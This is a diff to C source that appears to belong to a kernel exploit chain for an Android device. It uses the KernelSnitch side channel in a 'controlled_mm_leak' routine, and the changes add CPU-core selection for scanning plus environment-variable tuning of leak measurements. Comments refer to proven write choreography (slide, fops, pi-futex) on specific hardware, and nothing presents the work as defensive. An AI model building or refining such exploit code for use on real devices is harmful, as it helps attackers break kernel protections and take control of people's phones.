@@ -1,6 +1,56 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 
+/* Runtime CPU choice is scan-only. CORE itself stays the proven LITTLE
+ * literal, so slide/fops/pi-futex write choreography is unchanged. Perf-core
+ * scanning is opt-in until it is validated on dm1q hardware: RMG_SCAN_PERF=1. */
+int rmg_resolve_scan_core(void) {
+#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
+  const char *enable = getenv("RMG_SCAN_PERF");
+  if (!enable || strcmp(enable, "1") != 0) {
+    return RMG_CORE_LITERAL;
+  }
+  cpu_set_t current;
+  if (sched_getaffinity(0, sizeof(current), &current) != 0) {
+    return RMG_CORE_LITERAL;
+  }
+  long online = sysconf(_SC_NPROCESSORS_ONLN);
+  if (online > CPU_SETSIZE) {
+    online = CPU_SETSIZE;
+  }
+  for (int c = (int)online - 1; c >= 0; --c) {
+    if (!CPU_ISSET(c, &current)) {
+      continue;
+    }
+    cpu_set_t want;
+    CPU_ZERO(&want);
+    CPU_SET(c, &want);
+    if (sched_setaffinity(0, sizeof(want), &want) == 0) {
+      sched_setaffinity(0, sizeof(current), &current);
+      pr_info("KernelSnitch runtime scan core cpu=%d\n", c);
+      return c;
+    }
+  }
+#endif
+  return RMG_CORE_LITERAL;
+}
+
+static size_t rmg_profile_env_size(const char *name, size_t fallback,
+                                   size_t min, size_t max) {
+  const char *value = getenv(name);
+  if (!value || !*value) {
+    return fallback;
+  }
+  char *end = NULL;
+  errno = 0;
+  unsigned long long parsed = strtoull(value, &end, 0);
+  if (errno || end == value || *end || parsed < min || parsed > max) {
+    pr_warning("ignoring invalid %s=%s\n", name, value);
+    return fallback;
+  }
+  return (size_t)parsed;
+}
+
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
@@ -27,23 +77,6 @@ static int rmg_fast_profile_enabled(void) {
   const char *value = getenv("RMG_FAST");
   return value && *value && strcmp(value, "0") != 0;
 #endif
-}
-
-static size_t rmg_profile_env_size(const char *name, size_t fallback,
-                                   size_t min, size_t max) {
-  const char *value = getenv(name);
-  if (!value || !*value) {
-    return fallback;
-  }
-
-  char *end = NULL;
-  errno = 0;
-  unsigned long long parsed = strtoull(value, &end, 0);
-  if (errno || end == value || *end || parsed < min || parsed > max) {
-    pr_warning("ignoring invalid %s=%s\n", name, value);
-    return fallback;
-  }
-  return (size_t)parsed;
 }
 
 static void configure_kernelsnitch_profile(
@@ -988,7 +1021,25 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
     if (!state) {
       return -1;
     }
-    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
+    size_t repeat_default = REPEAT_MEASUREMENT;
+    size_t average_default = AVERAGE;
+#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
+    if (repeat_default > 64) {
+      repeat_default = 64;
+    }
+    if (average_default > 4) {
+      average_default = 4;
+    }
+#endif
+    size_t repeat = rmg_profile_env_size(
+        "RMG_KSNITCH_REPEAT", repeat_default, 8, REPEAT_MEASUREMENT);
+    size_t average = rmg_profile_env_size(
+        "RMG_KSNITCH_AVERAGE", average_default, 1, repeat);
+    if (average > repeat) {
+      average = repeat;
+    }
+    /* Preserve dm1q's proven controlled-mm pile-up of 256. */
+    kernelsnitch_set_profile(state, 256, repeat, average);
 #ifdef QEMU_MM_TRACE_VALIDATE
     uintptr_t oracle_mm = 0;
     if (!qemu_mm_trace_drain()) {
